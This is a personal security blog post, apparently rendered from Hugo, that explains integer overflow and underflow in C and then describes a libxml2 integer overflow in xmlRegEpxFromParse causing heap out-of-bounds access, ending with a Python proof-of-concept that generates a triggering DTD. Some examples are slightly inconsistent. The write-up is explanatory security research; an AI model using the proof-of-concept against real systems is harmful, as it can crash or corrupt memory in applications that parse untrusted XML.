@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Exploring Integer Overflow: libxml2 Integer Overflow, which leads to OOB - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="This article explores a critical integer overflow in libxml2 where improper bounds validation leads to out-of-bounds memory access. It walks through the vulnerable function, discusses how arithmetic truncation causes the bug, and demonstrates how attackers can exploit it to leak memory or crash the application." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/exploring-integer-overflow-libxml2-integer-overflo-2573648c0bf48058ace1d536b4a81251/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="Exploring Integer Overflow: libxml2 Integer Overflow, which leads to OOB">
+  <meta property="og:description" content="This article explores a critical integer overflow in libxml2 where improper bounds validation leads to out-of-bounds memory access. It walks through the vulnerable function, discusses how arithmetic truncation causes the bug, and demonstrates how attackers can exploit it to leak memory or crash the application.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-22T00:00:00+00:00">
+    <meta property="article:tag" content="Libxml2">
+    <meta property="article:tag" content="Integer Overflow">
+    <meta property="article:tag" content="OOB">
+    <meta property="article:tag" content="Heap">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Exploring Integer Overflow: libxml2 Integer Overflow, which leads to OOB">
+  <meta name="twitter:description" content="This article explores a critical integer overflow in libxml2 where improper bounds validation leads to out-of-bounds memory access. It walks through the vulnerable function, discusses how arithmetic truncation causes the bug, and demonstrates how attackers can exploit it to leak memory or crash the application.">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">🏠 Home</a>
+		
+		<a href="/posts">🗂️ All posts</a>
+		
+		<a href="/about">💡 About Me</a>
+		
+		<a href="/papers">📑 Publications</a>
+		
+		<a href="/tags">🏷️ Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Exploring Integer Overflow: libxml2 Integer Overflow, which leads to OOB</h1>
+			<div class="meta">Posted on Aug 22, 2025</div>
+		</div>
+		
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#11-signed-integer-overflow">1.1 Signed Integer Overflow</a></li>
+    <li><a href="#12-signed-integer-underflow"><strong>1.2 Signed Integer Underflow</strong></a></li>
+    <li><a href="#2-unsigned-integers">2. Unsigned Integers</a>
+      <ul>
+        <li><a href="#21-unsigned-integer-overflow">2.1 Unsigned Integer Overflow</a></li>
+        <li><a href="#22-unsigned-integer-underflow">2.2 Unsigned Integer Underflow</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#poc">PoC:</a></li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="exploring-integer-overflow-libxml2-integer-overflow-oob">Exploring Integer Overflow: libxml2 Integer Overflow OOB</h1>
+<p>In everyday life, numbers feel endless. You can always count one higher, or subtract one more. But computers don’t work like that. Inside your machine, numbers are stored in <strong>fixed-sized containers</strong>  and when you push them past their limits, strange things happen. When a calculation produces a value that’s too large or too small for its container, we get integer overflow or integer underflow.</p>
+<p>This is where <strong>integer overflow</strong> and <strong>integer underflow</strong> come in.</p>
+<p>These issues aren’t just curiosities  they can cause logic errors, crashes, and even security vulnerabilities. Let’s break it down step by step.</p>
+<h1 id="0-unsigned-and-signed-integers">0. Unsigned and Signed Integers</h1>
+<p><img src="Untitled_-_Frame_1.jpg" alt="Untitled - Frame 1.jpg"></p>
+<p>There are two main types of integers in programming: <strong>signed</strong> and <strong>unsigned</strong>.</p>
+<ul>
+<li>A <strong>signed integer</strong> can represent both positive and negative whole numbers (including zero). On most systems, a 32-bit signed integer ranges from <strong><code>−2,147,483,648</code> to <code>+2,147,483,647</code></strong>.</li>
+<li>An <strong>unsigned integer</strong> can only represent non-negative whole numbers (zero and positive values). A 32-bit unsigned integer ranges from <strong>0 to 4,294,967,295</strong>.</li>
+</ul>
+<p>As you see in table signed integers border is <strong><code>0x7fffffff</code></strong> - <strong><code>0x80000000</code></strong> which changes from positive (<strong><code>2,147,483,647</code></strong>) to negative(<code>-**2,147,483,648**</code>) decimal, then goes in ascending order till the <code>-1</code></p>
+<h1 id="1-signed-integers">1. Signed Integers</h1>
+<p>A signed integer can represent both positive and negative numbers. On most systems, a 32-bit signed integer (<code>int</code>) has the following range: <code>-2,147,483,648</code>  to  <code>2,147,483,647</code></p>
+<h2 id="11-signed-integer-overflow">1.1 Signed Integer Overflow</h2>
+<p><strong>Overflow happens when you exceed the maximum positive value.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;limits.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> x <span style="color:#ff79c6">=</span> INT_MAX;    <span style="color:#6272a4">// 2,147,483,647
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;x = %d in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, x, x);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    x <span style="color:#ff79c6">=</span> x <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;     <span style="color:#6272a4">// overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;x after overflow = %d in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, x, x);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>x <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2147483647</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0x7fffffff</span>
+</span></span><span style="display:flex;"><span>x after overflow <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">2147483648</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0x80000000</span>
+</span></span></code></pre></div><p>The number wrapped around from the maximum to the minimum value.</p>
+<h2 id="12-signed-integer-underflow"><strong>1.2 Signed Integer Underflow</strong></h2>
+<p><strong>Underflow happens when you go below the minimum negative value.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;limits.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> y <span style="color:#ff79c6">=</span> INT_MIN;    <span style="color:#6272a4">// -2,147,483,648
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;y = %d in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, y, y);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    y <span style="color:#ff79c6">=</span> y <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>;          <span style="color:#6272a4">// underflow
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;y after underflow = %d in Hex: %x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, y, y);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>y <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">2147483648</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0x80000000</span>
+</span></span><span style="display:flex;"><span>y after underflow <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2147483647</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0x7fffffff</span>
+</span></span></code></pre></div><h2 id="2-unsigned-integers">2. Unsigned Integers</h2>
+<p>An <strong>unsigned integer</strong> can only represent positive numbers. A 32-bit unsigned integer (<code>unsigned int</code>) has this range: <code>0</code>  to  <code>4,294,967,295</code></p>
+<h3 id="21-unsigned-integer-overflow">2.1 Unsigned Integer Overflow</h3>
+<p><strong>When you exceed the maximum value, it wraps around to zero.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;limits.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> u <span style="color:#ff79c6">=</span> UINT_MAX;  <span style="color:#6272a4">// 4,294,967,295
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;u = %u in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, u, u);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    u <span style="color:#ff79c6">=</span> u <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;  <span style="color:#6272a4">// overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;u after overflow = %u in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, u, u);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>u <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4294967295</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0xffffffff</span>
+</span></span><span style="display:flex;"><span>u after overflow <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0x0</span>
+</span></span></code></pre></div><h3 id="22-unsigned-integer-underflow">2.2 Unsigned Integer Underflow</h3>
+<p>When you subtract from zero, it wraps around to the maximum value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;limits.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> u <span style="color:#ff79c6">=</span> UINT_MAX;  <span style="color:#6272a4">// 4,294,967,295
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;u = %u in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, u, u);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    u <span style="color:#ff79c6">=</span> u <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;  <span style="color:#6272a4">// overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;u after overflow = %u in Hex: 0x%x</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, u, u);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>v after underflow <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4294967295</span> in <span style="color:#8be9fd;font-style:italic">Hex</span>: <span style="color:#bd93f9">0xffffffff</span>
+</span></span></code></pre></div><h1 id="libxml2-integer-overflow-leading-to-heap-buffer-overflow-in-xmlregepxfromparse"><strong>libxml2: Integer overflow leading to heap-buffer-overflow in xmlRegEpxFromParse</strong></h1>
+<p>A heap buffer overflow exists in the <code>xmlRegEpxFromParse</code> function within <strong>xmlregexp.c</strong>. The flaw arises from an integer overflow that occurs when calculating an index in the transitions table during the compilation of a regular expression used for DTD validation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">static</span> xmlRegexpPtr <span style="color:#50fa7b">xmlRegEpxFromParse</span>(xmlRegParserCtxtPtr ctxt) {
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> i, j, nbstates <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>, nbatoms <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>stateRemap;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>stringRemap;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>transitions;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">**</span>transdata;
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>  transitions <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>) <span style="color:#50fa7b">xmlRegCalloc2</span>(nbstates <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, nbatoms <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>)); <span style="color:#6272a4">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>[...]
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;i <span style="color:#ff79c6">&lt;</span> ret<span style="color:#ff79c6">-&gt;</span>nbStates; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd">int</span> stateno, atomno, targetno, prev;
+</span></span><span style="display:flex;"><span>      xmlRegStatePtr state;
+</span></span><span style="display:flex;"><span>      xmlRegTransPtr trans;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      stateno <span style="color:#ff79c6">=</span> stateRemap[i];
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (stateno <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>      state <span style="color:#ff79c6">=</span> ret<span style="color:#ff79c6">-&gt;</span>states[i];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      transitions[stateno <span style="color:#ff79c6">*</span> (nbatoms <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>)] <span style="color:#ff79c6">=</span> state<span style="color:#ff79c6">-&gt;</span>type;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">for</span> (j <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;j <span style="color:#ff79c6">&lt;</span> state<span style="color:#ff79c6">-&gt;</span>nbTrans;j<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>        prev <span style="color:#ff79c6">=</span> transitions[stateno <span style="color:#ff79c6">*</span> (nbatoms <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> atomno <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>]; <span style="color:#6272a4">// [2]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (prev <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>          transitions[stateno <span style="color:#ff79c6">*</span> (nbatoms <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> atomno <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> btargetno <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>; <span style="color:#6272a4">// Integer Overflow if (transdata != NULL)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            transdata[stateno <span style="color:#ff79c6">*</span> nbatoms <span style="color:#ff79c6">+</span> atomno] <span style="color:#ff79c6">=</span> trans<span style="color:#ff79c6">-&gt;</span>atom<span style="color:#ff79c6">-&gt;</span>data;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span></code></pre></div><p>When libxml2 processes a document with a DTD that defines a content model, it constructs an automaton, which is then compiled into a regular expression by <code>xmlRegEpxFromParse</code>. To represent this automaton, the function allocates a <code>transitions</code> [1] array that stores the state transition table. It then iterates over the automaton’s states and transitions, filling in the array. The index into this array is computed as: <code>stateno * (nbatoms + 1) + atomno + 1</code></p>
+<p>Here, <code>stateno</code>, <code>nbatoms</code>, and <code>atomno</code> are signed 32-bit integers. For very large automata, these values can grow large enough that the resulting calculation exceeds the 32-bit integer range, causing an overflow. This overflow wraps the result into a negative value, which is then incorrectly used as an index. As a result, the code attempts to read from the <code>transitions</code> buffer at [2] of <strong>xmlregexp.c</strong>, and later performs writes at line [3] using the same invalid index, leading to memory corruption.</p>
+<p>Raw PoC data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>DOCTYPE root [
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!</span>ELEMENT <span style="color:#50fa7b">root</span> (a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10, ..., a46339,a46340)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>ELEMENT a0 EMPTY<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>ELEMENT a1 EMPTY<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>ELEMENT a2 EMPTY<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>ELEMENT a46339 EMPTY<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>ELEMENT a46340 EMPTY<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>    ]<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>root<span style="color:#ff79c6">/&gt;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p><strong><code>nbatoms</code></strong></p>
+<p>This is the number of <strong>unique element names</strong> that appear in the content model.</p>
+<p>In our case: <code>a1</code>, <code>a2</code>, <code>a3</code>, <code>a4</code>  …</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nbatoms <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">46341</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong><code>stateno</code></strong></p>
+<p>This is the <strong>remapped index of the current state</strong> in the automaton.</p>
+<p>For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>State <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;start (expecting a1)&#34;</span>
+</span></span><span style="display:flex;"><span>State <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;after a1 (expecting a2)&#34;</span>
+</span></span><span style="display:flex;"><span>State <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;after a2 (expecting a3)&#34;</span>
+</span></span><span style="display:flex;"><span>State <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;after a3 (expecting a4)&#34;</span>
+</span></span><span style="display:flex;"><span>State <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;final (after a4)&#34;</span>
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div><p>So you’ll have ~5 states total, each with its own <code>stateno</code>.</p>
+</li>
+<li>
+<p><strong><code>atomno</code></strong></p>
+<p>This is the <strong>index of the atom (element name)</strong> being processed in the current state’s transitions.</p>
+<p>Example mapping:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>atomno 0 → a1
+</span></span><span style="display:flex;"><span>atomno 1 → a2
+</span></span><span style="display:flex;"><span>atomno 2 → a3
+</span></span><span style="display:flex;"><span>atomno 3 → a4
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div></li>
+</ul>
+<p>Although the memory allocation function <code>xmlRegCalloc2</code> [1]  does include integer overflow checks, these only apply to its internal size calculations, which use <code>size_t</code> (64-bit on modern systems). The problem persists because the indexing arithmetic in <code>xmlRegEpxFromParse</code> relies on 32-bit signed integers. This means that even though <code>xmlRegCalloc2</code> can successfully allocate more than 2GB of memory on a 64-bit system, the 32-bit index arithmetic still overflows, resulting in out-of-bounds reads and writes to the heap buffer.</p>
+<h2 id="poc">PoC:</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NUM_ELEMENTS <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">46341</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>element_names <span style="color:#ff79c6">=</span> [f<span style="color:#f1fa8c">&#34;a{i}&#34;</span> <span style="color:#ff79c6">for</span> i in <span style="color:#50fa7b">range</span>(NUM_ELEMENTS)]
+</span></span><span style="display:flex;"><span>content_model <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;,&#34;</span>.<span style="color:#50fa7b">join</span>(element_names)
+</span></span><span style="display:flex;"><span>element_decls <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>.<span style="color:#50fa7b">join</span>(f<span style="color:#f1fa8c">&#34;&lt;!ELEMENT {name} EMPTY&gt;&#34;</span> <span style="color:#ff79c6">for</span> name in element_names)
+</span></span><span style="display:flex;"><span>xml_content <span style="color:#ff79c6">=</span> f&#39;&#39;&#39;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!</span>DOCTYPE root [
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!</span>ELEMENT <span style="color:#50fa7b">root</span> ({content_model})<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>    {element_decls}
+</span></span><span style="display:flex;"><span>    ]<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>root<span style="color:#ff79c6">/&gt;</span>
+</span></span><span style="display:flex;"><span>&#39;&#39;&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">print</span>(xml_content)
+</span></span></code></pre></div><p><code>46341 * (46341+1) + 1 = 0x8000c71f</code>  overflow occured</p>
+<p><img src="image.png" alt="image.png"></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/libxml2">libxml2</a></li>
+					
+					<li><a href="/tags/integer-overflow">Integer Overflow</a></li>
+					
+					<li><a href="/tags/oob">OOB</a></li>
+					
+					<li><a href="/tags/heap">heap</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2025  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
